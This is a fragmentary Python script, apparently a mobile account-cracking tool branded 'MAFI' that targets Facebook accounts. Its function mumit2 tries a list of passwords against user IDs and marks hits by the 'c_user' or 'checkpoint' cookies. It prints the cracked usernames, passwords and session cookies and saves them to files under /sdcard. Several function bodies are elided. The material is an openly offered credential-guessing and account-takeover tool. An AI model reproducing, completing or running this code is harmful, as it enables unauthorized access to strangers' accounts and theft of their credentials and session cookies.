...
logo = ("""
\033[31;1m███╗░░░███╗\033[33;1m░█████╗░\033[30;1m███████╗\033[37;1m██╗
\033[31;1m████╗░████║\033[33;1m██╔══██╗\033[30;1m██╔════╝\033[37;1m██║
\033[31;1m██╔████╔██║\033[33;1m███████║\033[30;1m█████╗░░\033[37;1m██║
\033[31;1m██║╚██╔╝██║\033[33;1m██╔══██║\033[30;1m██╔══╝░░\033[37;1m██║
\033[31;1m██║░╚═╝░██║\033[33;1m██║░░██║\033[30;1m██║░░░░░\033[37;1m██║
...
def fuck():
    ...
    print(' [+] OK Ids saved in MAFI/OK.txt')
    print(' [+] CP Ids saved in MAFI/CP.txt')
    print('==================================================')
def mumit2(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;92m[MAFI]--[%s/%s]--[CP-%s]~[OK-%s] \r'%(loop,tl,len(cps),len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"""\033[1;92m[MAFI-OK] ✅
Username : {uid} 
Password : {ps} 
\nCookie : {coki}
""")
#____cp____info 👇👇
                open('/sdcard/MAFI/OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"""\033[1;92m[MAFI-CP] 
Username : {cid}
Password : {ps}
""")
                open('/sdcard/MAFI-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
